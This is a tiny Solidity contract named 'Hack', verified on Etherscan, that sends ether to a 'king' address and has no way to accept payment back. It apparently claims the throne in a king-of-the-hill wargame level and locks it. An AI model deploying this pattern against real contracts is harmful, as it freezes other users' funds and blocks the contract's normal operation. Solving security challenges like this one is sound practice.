/**
 *Submitted for verification at Etherscan.io on 2022-07-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
  function hack(address payable king) public payable {
    king.call{value:msg.value}("");
  }
}